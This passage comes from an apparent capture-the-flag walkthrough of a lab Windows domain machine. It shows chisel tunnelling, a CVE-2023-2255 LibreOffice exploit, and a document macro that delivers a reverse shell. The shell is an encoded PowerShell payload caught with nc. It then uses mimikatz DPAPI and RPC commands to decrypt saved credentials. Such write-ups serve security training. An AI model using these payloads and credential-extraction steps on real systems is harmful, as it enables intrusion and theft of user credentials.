d-----         4/14/2023   6:05 PM                Teams Installer
d-----          5/8/2021   2:35 AM                Windows Defender
d-----         1/25/2024  12:20 PM                Windows Mail
d-----         1/25/2024  12:20 PM                Windows Media Player
d-----          5/8/2021   2:35 AM                Windows NT
d-----          3/2/2022   7:58 PM                Windows Photo Viewer
d-----          5/8/2021   1:34 AM                WindowsPowerShell 

```

It’s worth noting that LibreOffice is installed, where as there’s no sign of Microsoft Office.

### Internal Site

#### Tunnel

I’ll upload a copy of [Chisel](https://github.com/jpillora/chisel) to Office:

```

PS C:\programdata> wget 10.10.14.5/chisel_1.9.1_windows_amd64 -outfile c.exe

```

And start the server on my host. Now I’ll connect back:

```

PS C:\programdata> .\c.exe client 10.10.14.5:8000 R:8083:127.0.0.1:8083
2024/06/14 18:39:56 client: Connecting to ws://10.10.14.5:8000
2024/06/14 18:39:56 client: Connected (Latency 23.0859ms)

```

It hangs, and there’s a connection at my host:

```

oxdf@hacky$ /opt/chisel/chisel_1.9.1_linux_amd64 server --port 8000 --reverse
2024/06/14 13:39:36 server: Reverse tunnelling enabled
2024/06/14 13:39:36 server: Fingerprint si/eRiyyOHhstQZQE9RA3RN5xOthM9i302ffptluHgc=
2024/06/14 13:39:36 server: Listening on http://0.0.0.0:8000
2024/06/14 13:39:58 server: session#1: tun: proxy#R:8083=>8083: Listening

```

#### Site

Now accessible at `http://127.0.0.1:8083` on my host, I’ll check out the site, which is for some kind of holographic technologies:

![image-20240614134138340](/img/image-20240614134138340.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

This page is the `index.html` file observed above, and there’s a link to `/resume.php` as “Submit Application”. This page is a form:

![image-20240614134238461](/img/image-20240614134238461.png)

If I upload a file with a blocked extension, it shows an error:

![image-20240614141249885](/img/image-20240614141249885.png)

If I create a text file but name it `test.odt`, it uploads:

![image-20240614141320342](/img/image-20240614141320342.png)

#### Source

More than half of `resume.php` is static HTML making up the form, but there’s PHP right at the top to handle POST requests:

```

<?php
$notifi = "";
if($_SERVER["REQUEST_METHOD"] == "POST" ){
  $stdname=trim($_POST['fullname']);
  $email=str_replace('.','-',$_POST['email']);
  $experience=trim($_POST['experience']);
  $salary=trim($_POST['salary']);
  $department=trim($_POST['department']);
  $rewritefn = strtolower(str_replace(' ','-',"$stdname-$department-$salary $experience $email"));

  $filename =$_FILES['assignment']['name'];
  $filetype= $_FILES['assignment']['type'];
  $filesize =$_FILES['assignment']['size'];
  $fileerr = $_FILES['assignment']['error'];
  $filetmp = $_FILES['assignment']['tmp_name'];
  chmod($_FILES['assignment']['tmp_name'], 0664);
  // onigiri in .
 $ext = explode('.',$filename);
  //last piece of data from array
 $extension = strtolower(end($ext));
  $filesallowed = array('docm','docx','doc','odt');
   if(in_array($extension,$filesallowed)){
     if ($fileerr === 0){
       if ($filesize < 5242880){
         $ff = "$rewritefn.$extension";
         $loc = "applications/".$ff;
           if(move_uploaded_file($filetmp,$loc))
           {
             // upload successful
             $notifi="<span class=notifi>o" Upload Successful!</span><hr/><style>
               button, input , select, option, h3{
                        display:none;
                }
               </style>";
         } else {
echo $loc;
         $notifi="<span class=notifi>o-,?  Something Went Wrong! Unable To upload the Resume!</span><hr/>";
         }

       } else {

         $notifi="<span class=notifi>s,?  Your Resume should be less than 5MB!</span><hr/>";
       }

     } else {
   $notifi="<span class=notifi>o-,?  Corrupted File/Unable to Upload!</span><hr/>";
     }

   } else {
   $notifi="<span class=notifi>?O Accepted File Types : Doc, Docx, Docm, Odt!</span><hr/>";
   }
}
?>

```

This is doing some file renaming, and validating that the extension is one of `docm`, `docx`, `doc`, or `odt`. Then it saves it under an new name to the `applications` folder (that is owned by PPotts).

Uploading a valid file does show up in `applications`:

```

PS C:\xampp\htdocs\internal\applications> ls

    Directory: C:\xampp\htdocs\internal\applications

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/14/2024   7:13 PM              5 0xdf-it-30-000-0-5-years-0xdf@office-htb.odt

```

After a few minutes, it’s gone.

### RCE Options

There are a couple ways to execute the next step:

```

flowchart TD;
    A[Write access as web_account]-->B(<a href='#via-cve-2023-2255'>CVE-2023-2255</a>);
    B-->C[Shell as PPotts];
    A-->D(<a href='#via-macros'>Macros</a>);
    D-->C;
    subgraph identifier[" "]
      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px;
    end

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 0,1,5 stroke-width:2px,stroke:#4B9CD3,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

### Via CVE-2023-2255

#### Background

[CVE-2023-2255](https://www.libreoffice.org/about-us/security/advisories/cve-2023-2255/) abuses a “Floating Frame” (similar to an IFrame in HTML) to fetch and display objects within a document. Because these objects can be OLE objects, this can lead to remote code execution.

There’s a simple [POC exploit](https://github.com/elweth-sec/CVE-2023-2255) from elweth-sec that takes `--cmd` and `--output` arguments and generates a ODT file.

#### Execute POC

I’ll start with a simple `ping` to make sure this works:

```

oxdf@hacky$ python CVE-2023-2255.py --cmd "cmd /c ping 10.10.14.5" --output ../0xdf.odt                                                                            
File ../0xdf.odt has been created !

```

I’ll upload it and make sure it’s there:

```

PS C:\xampp\htdocs\internal\applications> ls

    Directory: C:\xampp\htdocs\internal\applications

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/14/2024   7:23 PM          30506 0xdf-it-30-000-0-5-years-0xdf@office-htb.odt

```

After a minute or two, I get ICMP packets:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
14:28:50.892487 IP 10.10.11.3 > 10.10.14.5: ICMP echo request, id 1, seq 2130, length 40
14:28:50.892528 IP 10.10.14.5 > 10.10.11.3: ICMP echo reply, id 1, seq 2130, length 40
14:28:51.901922 IP 10.10.11.3 > 10.10.14.5: ICMP echo request, id 1, seq 2131, length 40
14:28:51.901940 IP 10.10.14.5 > 10.10.11.3: ICMP echo reply, id 1, seq 2131, length 40
14:28:52.917575 IP 10.10.11.3 > 10.10.14.5: ICMP echo request, id 1, seq 2132, length 40
14:28:52.917607 IP 10.10.14.5 > 10.10.11.3: ICMP echo reply, id 1, seq 2132, length 40
14:28:53.933086 IP 10.10.11.3 > 10.10.14.5: ICMP echo request, id 1, seq 2133, length 40
14:28:53.933100 IP 10.10.14.5 > 10.10.11.3: ICMP echo reply, id 1, seq 2133, length 40

```

#### Shell

I’ll grab a PowerShell #3 Bash64 reverse shell from [revshells.com](https://www.revshells.com/) and create an ODT:

```

oxdf@hacky$ python CVE-2023-2255.py --cmd "cmd /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQAiACwANAA0ADYAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA" --output 0xdf.odt
File ../0xdf.odt has been created !

```

I’ll upload it via the form, and after a few minutes I get a shell as PPotts:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 446
Listening on 0.0.0.0 446
Connection received on 10.10.11.3 53152

PS C:\Program Files\LibreOffice 5\program> whoami
office\ppotts 

```

### Via Macros

#### Reduce Macro Security

I can create a document with an auto open macro and try to run that, but the macro’s won’t run in the default state. [This wiki page](https://wiki.documentfoundation.org/Deployment_and_Migration#Windows_Registry) documents the `MacroSecurityLevel` registry key that shows the current settings:

```

PS C:\> $keyPath = "HKLM:\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting"
PS C:\> Get-ItemProperty -Path "$keyPath\MacroSecurityLevel"

Value        : 3
Final        : 1
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Offi
               ce.Common\Security\Scripting\MacroSecurityLevel
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Offi
               ce.Common\Security\Scripting
PSChildName  : MacroSecurityLevel
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry

```

Based on [this page](https://help.libreoffice.org/6.1/he/text/shared/optionen/macrosecurity_sl.html), the value of 3 is currently set on Very High. The ACLs on this key show that the “Registry Editors” group has `FullControl`:

```

PS C:\> (Get-Acl $keyPath).Access

RegistryRights    : FullControl
AccessControlType : Allow
IdentityReference : OFFICE\Registry Editors
IsInherited       : True
InheritanceFlags  : ContainerInherit
PropagationFlags  : None

RegistryRights    : ReadKey
AccessControlType : Allow
IdentityReference : NT AUTHORITY\Authenticated Users
IsInherited       : True
InheritanceFlags  : None
PropagationFlags  : None

RegistryRights    : -2147483648
AccessControlType : Allow
IdentityReference : NT AUTHORITY\Authenticated Users
IsInherited       : True
InheritanceFlags  : ContainerInherit, ObjectInherit
PropagationFlags  : InheritOnly

RegistryRights    : FullControl
AccessControlType : Allow
IdentityReference : NT AUTHORITY\SYSTEM
IsInherited       : True
InheritanceFlags  : None
PropagationFlags  : None

RegistryRights    : 268435456
AccessControlType : Allow
IdentityReference : NT AUTHORITY\SYSTEM
IsInherited       : True
InheritanceFlags  : ContainerInherit, ObjectInherit
PropagationFlags  : InheritOnly

RegistryRights    : FullControl
AccessControlType : Allow
IdentityReference : BUILTIN\Administrators
IsInherited       : True
InheritanceFlags  : None
PropagationFlags  : None

RegistryRights    : 268435456
AccessControlType : Allow
IdentityReference : BUILTIN\Administrators
IsInherited       : True
InheritanceFlags  : ContainerInherit, ObjectInherit
PropagationFlags  : InheritOnly

RegistryRights    : ReadKey
AccessControlType : Allow
IdentityReference : APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES
IsInherited       : True
InheritanceFlags  : None
PropagationFlags  : None

RegistryRights    : -2147483648
AccessControlType : Allow
IdentityReference : APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES
IsInherited       : True
InheritanceFlags  : ContainerInherit, ObjectInherit
PropagationFlags  : InheritOnly

RegistryRights    : ReadKey
AccessControlType : Allow
IdentityReference : S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-345693468
                    1
IsInherited       : True
InheritanceFlags  : None
PropagationFlags  : None

RegistryRights    : -2147483648
AccessControlType : Allow
IdentityReference : S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-345693468
                    1
IsInherited       : True
InheritanceFlags  : ContainerInherit, ObjectInherit
PropagationFlags  : InheritOnly

```

I’ll update it:

```

PS C:\> Set-ItemProperty -Path "$keyPath\MacroSecurityLevel" -Name "Value" -Value 0
PS C:\> Get-ItemProperty -Path "$keyPath\MacroSecurityLevel"

Value        : 0
Final        : 1
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Offi
               ce.Common\Security\Scripting\MacroSecurityLevel
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Offi
               ce.Common\Security\Scripting
PSChildName  : MacroSecurityLevel
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry

```

It works! It’s worth noting that when I check back in a few minutes the value has reset back to 3.

#### Create Malicious Document

I’ll open LibreOffice Writer and a new document, add a macro, and have it run my reverse shell:

![image-20240614145943411](/img/image-20240614145943411.png)

Under “Tools” –> “Customize”, I’ll assign the macro to Open Document:

![image-20240614150044146](/img/image-20240614150044146.png)

#### Shell

I’ll upload this document and wait again. When it processes, I get a reverse shell:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 446
Listening on 0.0.0.0 446
Connection received on 10.10.11.3 53338

PS C:\Program Files\LibreOffice 5\program>

```

## Shell as HHogan

### Enumeration

`cmdkey /list` will show if there are any saved credentials on the current account:

```

PS C:\Users\PPotts> cmdkey /list

Currently stored credentials:

    Target: LegacyGeneric:target=MyTarget
    Type: Generic 
    User: MyUser
    
    Target: Domain:interactive=office\hhogan
    Type: Domain Password
    User: office\hhogan

```

The one for HHogan is certainly of interest. They are in the Remote Management Users group, which means if I can recover this credential I can likely connect over WinRM:

```

PS C:\Users\PPotts> net user hhogan
User name                    HHogan
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/6/2023 11:59:34 AM
Password expires             Never
Password changeable          5/7/2023 11:59:34 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   5/10/2023 5:30:58 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *GPO Managers         
The command completed successfully.

```

They are also a “GPO Manager”, which will be a escalation vector.

The system level credentials are stored by DPAPI here:

```

PS C:\Users\PPotts> gci -force AppData\Roaming\Microsoft\Credentials

    Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a-hs-          5/9/2023   2:08 PM            358 18A1927A997A794B65E9849883AC3F3E                                     
-a-hs-          5/9/2023   4:03 PM            398 84F1CAEEBF466550F4967858F9353FB4                                     
-a-hs-         1/18/2024  11:53 AM            374 E76CCA3670CD9BB98DF79E0A8D176F1E

```

The master keys for these is stored here:

```

PS C:\Users\PPotts> gci -force AppData\Roaming\Microsoft\Protect

    Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Protect

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-         1/17/2024   3:43 PM                S-1-5-21-1199398058-4196589450-691661856-1107
-a-hs-          5/2/2023   4:13 PM             24 CREDHIST
-a-hs-         1/17/2024   4:06 PM             76 SYNCHIST
PS C:\Users\PPotts> gci -force AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107

    Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-         6/13/2024  10:07 PM            740 0c75ca0b-2cde-44e3-976a-c5a2c9b66f6f
-a-hs-         1/17/2024   3:43 PM            740 10811601-0fa9-43c2-97e5-9bef8471fc7d
-a-hs-          5/2/2023   4:13 PM            740 191d3f9d-7959-4b4d-a520-a444853c47eb
-a-hs-          5/2/2023   4:13 PM            900 BK-OFFICE
-a-hs-         6/13/2024  10:07 PM             24 Preferred  

```

### Decrypt Credential

#### Decrypt Master Key

I’ve shown the case of decrypting a DPAPI master key before in [Access](/2019/03/02/htb-access.html#privesc-2---dpapi-creds). The challenge is that the master key is encrypted with the user’s password, and I don’t have it. Fortunately, there’s a [blog post](https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107) from SpecterOps that shows how to decrypt without the password, using an RPC called MS-BKRP (BackupKey Remote Protocol). To abuse this I’ll use the `/rpc` flag in [Mimikatz](https://github.com/gentilkiwi/mimikatz).

I’ll upload a copy of `mimikatz.exe` and run it. From my flimsy shell, I’ll want to run the commands all at once by passing them in, giving the path to the master key as well as the `/rpc` flag:

```

PS C:\programdata> .\mimikatz.exe "dpapi::masterkey /in:C:\users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # dpapi::masterkey /in:C:\users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc
**MASTERKEYS**
  dwVersion          : 00000002 - 2
  szGuid             : {191d3f9d-7959-4b4d-a520-a444853c47eb}
  dwFlags            : 00000000 - 0
  dwMasterKeyLen     : 00000088 - 136
  dwBackupKeyLen     : 00000068 - 104
  dwCredHistLen      : 00000000 - 0
  dwDomainKeyLen     : 00000174 - 372
[masterkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : c521daa0857ee4fa6e4246266081e94c
    rounds           : 00004650 - 18000
    algHash          : 00008009 - 32777 (CALG_HMAC)
    algCrypt         : 00006603 - 26115 (CALG_3DES)
    pbKey            : 1107e1ab3e107528a73a2dafc0a2db28de1ea0a07e92cff03a935635013435d75e41797f612903d6eea41a8fc4f7ebe8d2fbecb0c74cdebb1e7df3c692682a066faa3edf107792d116584625cc97f0094384a5be811e9d5ce84e5f032704330609171c973008d84f

[backupkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : a2741b13d7261697be4241ebbe05098a
    rounds           : 00004650 - 18000
    algHash          : 00008009 - 32777 (CALG_HMAC)
    algCrypt         : 00006603 - 26115 (CALG_3DES)
    pbKey            : 21bf24763fbb1400010c08fccc5423fe7da8190c61d3006f2d5efd5ea586f463116805692bae637b2ab548828b3afb9313edc715edd11dc21143f4ce91f4f67afe987005320d3209

[domainkey]
  **DOMAINKEY**
    dwVersion        : 00000002 - 2
    dwSecretLen      : 00000100 - 256
    dwAccesscheckLen : 00000058 - 88
    guidMasterKey    : {e523832a-e126-4d6e-ac04-ed10da72b32f}
    pbSecret         : 159613bdc2d90dd4834a37e29873ce04c74722a706d0ba4770865039b3520ff46cf9c9281542665df2e72db48f67e16e2014e07b88f8b2f7d376a8b9d47041768d650c20661aee31dc340aead98b7600662d2dc320b4f89cf7384c2a47809c024adf0694048c38d6e1e3e10e8bd7baa7a6f1214cd3a029f8372225b2df9754c19e2ae4bc5ff4b85755b4c2dfc89add9f73c54ac45a221e5a72d3efe491aa6da8fb0104a983be20af3280ae68783e8648df413d082fa7d25506e9e6de1aadbf9cf93ec8dfc5fab4bfe1dd1492dbb679b1fa25c3f15fb8500c6021f518c74e42cd4b5d5d6e1057f912db5479ebda56892f346b4e9bf6404906c7cd65a54eea2842
    pbAccesscheck    : 1430b9a3c4ab2e9d5f61dd6c62aab8e1742338623f08461fe991cccd5b3e4621d4c8e322650460181967c409c20efcf02e8936c007f7a506566d66ba57448aa8c3524f0b9cf881afcbb80c9d8c341026f3d45382f63f8665

Auto SID from path seems to be: S-1-5-21-1199398058-4196589450-691661856-1107

[backupkey] without DPAPI_SYSTEM:
  key : 4d1b2c18baba7442e79d33cc771bf54027ae2500e08da3ecfccf91303bd471b6
  sha1: eeb787c4259e3c8b8408201ee5e54fc29fad22b2

[domainkey] with RPC
[DC] 'office.htb' will be the domain
[DC] 'DC.office.htb' will be the DC server
  key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
  sha1: 85285eb368befb1670633b05ce58ca4d75c73c77

mimikatz(commandline) # exit
Bye!

```

The key is at the bottom, “87eedae4c65e0db…[snip]…”.

#### Decrypt Credentials

I don’t know which of the three encrypted creds are the one I’m looking for, so I’ll just do all three. I need to pass in the directory as well as the masterkey from above. The first one is the “MyUser” cred, and doesn’t return anything useful:

```

PS C:\programdata> .\mimikatz.exe "dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\18A1927A997A794B65E9849883AC3F3E /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\18A1927A997A794B65E9849883AC3F3E /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data

  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : 88fdf043461d4913a49680c2cf45e8e6
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : b68952824efb5374f396ef024b7f4f56
  dwDataLen          : 00000098 - 152
  pbData             : 0c1483543655e1eee285cb5244a83b72932723e88f937112d54896b19569be22aeda49f9aec91131dab8edae525506e7aa4861c98d67768350051ae93d9c493596d3e506fae0b6e885acd9d2a2837095d7da3f60d80288f4f8b8800171f26639df136e45eb399341ab216c81cf753aecc5342b6b212d85a46be1e2b45f6fcebd140755ec9d328c6d66a7bab635346de54fee236a63d20507
  dwSignLen          : 00000014 - 20
  pbSign             : 3a5e83bb958d713bfae523404a4de188a0319830

Decrypting Credential:
 * masterkey     : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 00000092 - 146
  credUnk0       : 00000000 - 0

  Type           : 00000001 - 1 - generic
  Flags          : 00000000 - 0
  LastWritten    : 5/9/2023 9:08:54 PM
  unkFlagsOrSize : 00000000 - 0
  Persist        : 00000003 - 3 - enterprise
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : LegacyGeneric:target=MyTarget
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : MyUser
  CredentialBlob :
  Attributes     : 0

mimikatz(commandline) # exit
Bye!

```

The third one errors out:

```

PS C:\programdata> mimikatz(commandline) # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\E76CCA3670CD9BB98DF79E0A8D176F1E /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {10811601-0fa9-43c2-97e5-9bef8471fc7d}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data

  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : 98d5fae89fd2aa297e5b56fff50a935d
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : 1e6765360d9bbfd511bc5c30e366485d
  dwDataLen          : 000000a8 - 168
  pbData             : b3fe8d6e16f600055f65332874a6a6f1cc9b256edd22812ab615cd680096a34d5ba1baae7a2522beac4a0fd9e2f2af69796a3dba0afba53d87ebc1d779764ae59cb6bc076400e3481cb922032a6b8398c2f76e62ecaf59bd625bef5692ff14f8fd62b6daf2f9576d7bdf36922663452d8f694f78c6e61b23e0f5f37470d8109812e7de03a08264cfbcfb4c489cf4867acf609b6f9297489a1975004723ddb51c9bd1a162255144b3
  dwSignLen          : 00000014 - 20
  pbSign             : 61c53169de0f977282c18917d1bb630d67f3cb33

Decrypting Credential:
 * masterkey     : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
ERROR kull_m_dpapi_unprotect_blob ; CryptDecrypt (0x80090005)

mimikatz(commandline) # exit
Bye!

```

The second returns the plaintext creds for HHogan:

```

PS C:\programdata> .\mimikatz.exe "dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data

  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
  dwDataLen          : 000000c0 - 192
